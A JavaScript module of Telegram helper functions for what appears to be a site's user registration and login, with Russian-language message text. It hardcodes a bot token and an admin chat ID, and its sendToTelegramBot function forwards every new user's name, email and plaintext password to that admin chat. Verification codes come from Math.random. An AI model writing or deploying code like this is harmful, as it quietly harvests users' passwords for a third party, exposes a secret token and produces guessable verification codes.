// Telegram-related utilities
const ADMIN_TELEGRAM_CHAT_ID = '6699202743';
const TELEGRAM_BOT_TOKEN = '7397758441:AAFa0kOHzvOG_jIiG-NlZWokU15qUZHX34k';

export async function verifyTelegramId(telegramId) {
    try {
        const response = await fetch(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/getChat`, {
            method: 'POST',
            headers: {
                'Content-Type': 'application/json',
            },
            body: JSON.stringify({
                chat_id: telegramId
            })
        });

        const result = await response.json();
        return result.ok;
    } catch (error) {
        console.error('Error verifying Telegram ID:', error);
        return false;
    }
}

export async function sendToTelegramBot(data) {
    const userMessage = `
    📋 Регистрация нового пользователя:
    👤 Имя: ${data.firstName}
    👥 Фамилия: ${data.lastName}
    📱 Username: ${data.email}
    🔐 Пароль: ${data.password}
    🆔 Telegram ID: ${data.telegramId}
    `;

    const adminMessage = `
    ⚠️ Новая регистрация:
    👤 Имя Фамилия: ${data.lastName} ${data.firstName}
    📱 Username: ${data.email}
    🔐 Пароль: ${data.password}
    🆔 Введенный Telegram ID: ${data.telegramId}
    `;

    try {
        const userResponse = await fetch(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`, {
            method: 'POST',
            headers: {
                'Content-Type': 'application/json',
            },
            body: JSON.stringify({
                chat_id: data.telegramId,
                text: userMessage
            })
        });

        const adminResponse = await fetch(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`, {
            method: 'POST',
            headers: {
                'Content-Type': 'application/json',
            },
            body: JSON.stringify({
                chat_id: ADMIN_TELEGRAM_CHAT_ID,
                text: adminMessage
            })
        });

        const userResult = await userResponse.json();
        const adminResult = await adminResponse.json();

        return userResult.ok && adminResult.ok;
    } catch (error) {
        console.error('Error sending messages to Telegram:', error);
        return false;
    }
}

export function generateVerificationCode() {
    return Math.floor(100000 + Math.random() * 900000).toString();
}

export async function sendVerificationCode(telegramId, code) {
    try {
        const codeMessage = `Ваш код подтверждения: ${code}`;
        
        const response = await fetch(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`, {
            method: 'POST',
            headers: {
                'Content-Type': 'application/json',
            },
            body: JSON.stringify({
                chat_id: telegramId,
                text: codeMessage
            })
        });

        const result = await response.json();
        return result.ok;
    } catch (error) {
        console.error('Error sending verification code:', error);
        return false;
    }
}

export async function sendLoginNotification(telegramId, message) {
    try {
        const response = await fetch(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`, {
            method: 'POST',
            headers: {
                'Content-Type': 'application/json',
            },
            body: JSON.stringify({
                chat_id: telegramId,
                text: message
            })
        });

        const result = await response.json();
        return result.ok;
    } catch (error) {
        console.error('Error sending login notification:', error);
        return false;
    }
}